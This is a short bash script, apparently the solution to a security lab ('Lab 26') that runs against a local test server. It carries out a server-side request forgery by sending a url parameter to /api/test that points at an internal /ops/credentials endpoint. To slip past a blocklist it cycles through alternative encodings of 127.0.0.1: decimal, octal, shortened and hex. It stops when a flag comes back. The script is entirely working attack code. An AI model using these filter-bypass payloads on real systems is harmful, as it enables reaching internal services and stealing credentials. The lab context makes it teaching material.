#!/usr/bin/env bash
# Lab 26 — 2130706433 is 127.0.0.1 written as one integer. The blocklist has
# never heard of it; the resolver has.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:9260}"
. "$(dirname "$0")/../lib/h5i.sh"
new_session lab26

"$H5I" browser open "$URL/" --session "$SESSION" --new --capture >/dev/null

for HOST in 2130706433 0177.0.0.1 127.1 0x7f.0.0.1; do
    OUT="$(send "$SESSION" req_0 --create --set path=/api/test \
        --set "query.url=http://$HOST:9261/ops/credentials" | flag)"
    printf '%-14s %s\n' "$HOST" "$OUT" >&2
    [ "$OUT" != "no flag found" ] && { printf '%s\n' "$OUT"; exit 0; }
done
echo "no flag found"
